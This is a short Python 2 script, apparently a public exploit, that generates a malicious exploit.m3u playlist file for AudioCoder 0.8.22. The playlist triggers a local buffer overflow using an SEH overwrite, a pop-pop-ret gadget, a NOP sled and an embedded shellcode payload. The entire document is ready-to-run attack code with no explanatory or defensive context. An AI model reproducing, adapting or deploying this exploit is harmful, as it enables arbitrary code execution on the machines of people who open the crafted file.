#!/usr/bin/python

print "AudioCoder 0.8.22 Local Buffer Overflow "
from struct import pack

junk = "http://" + "A" * 757
nseh = "\xeb\x14\x90\x90"
SEH = "\xc8\x5a\x01\x66" #66015ac8 pop pop ret
nop = "\x90" * 20
shell = ("\xd9\xca\xd9\x74\x24\xf4\x58\xbd\xf2\xd4\xdf\xd1\x31\xc9\xb1"
"\x31\x31\x68\x18\x03\x68\x18\x83\xc0\xf6\x36\x2a\x2d\x1e\x34"
"\xd5\xce\xde\x59\x5f\x2b\xef\x59\x3b\x3f\x5f\x6a\x4f\x6d\x53"
"\x01\x1d\x86\xe0\x67\x8a\xa9\x41\xcd\xec\x84\x52\x7e\xcc\x87"
"\xd0\x7d\x01\x68\xe9\x4d\x54\x69\x2e\xb3\x95\x3b\xe7\xbf\x08"
"\xac\x8c\x8a\x90\x47\xde\x1b\x91\xb4\x96\x1a\xb0\x6a\xad\x44"
"\x12\x8c\x62\xfd\x1b\x96\x67\x38\xd5\x2d\x53\xb6\xe4\xe7\xaa"
"\x37\x4a\xc6\x03\xca\x92\x0e\xa3\x35\xe1\x66\xd0\xc8\xf2\xbc"
"\xab\x16\x76\x27\x0b\xdc\x20\x83\xaa\x31\xb6\x40\xa0\xfe\xbc"
"\x0f\xa4\x01\x10\x24\xd0\x8a\x97\xeb\x51\xc8\xb3\x2f\x3a\x8a"
"\xda\x76\xe6\x7d\xe2\x69\x49\x21\x46\xe1\x67\x36\xfb\xa8\xed"
"\xc9\x89\xd6\x43\xc9\x91\xd8\xf3\xa2\xa0\x53\x9c\xb5\x3c\xb6"
"\xd9\x44\xcc\x0b\xf7\xd1\x77\xfe\xba\xbf\x87\xd4\xf8\xb9\x0b"
"\xdd\x80\x3d\x13\x94\x85\x7a\x93\x44\xf7\x13\x76\x6b\xa4\x14"
"\x53\x08\x2b\x87\x3f\xe1\xce\x2f\xa5\xfd") 

junk2 = "D" * (5000-(len(junk+nseh+SEH+nop+shell)))

exploit = junk + nseh + SEH + nop + shell + junk2

try:
    file= open("exploit.m3u",'w')
    file.write(exploit)
    file.close()
    raw_input("\nExploit has been created!\n")
except:
    print "There has been an Error"
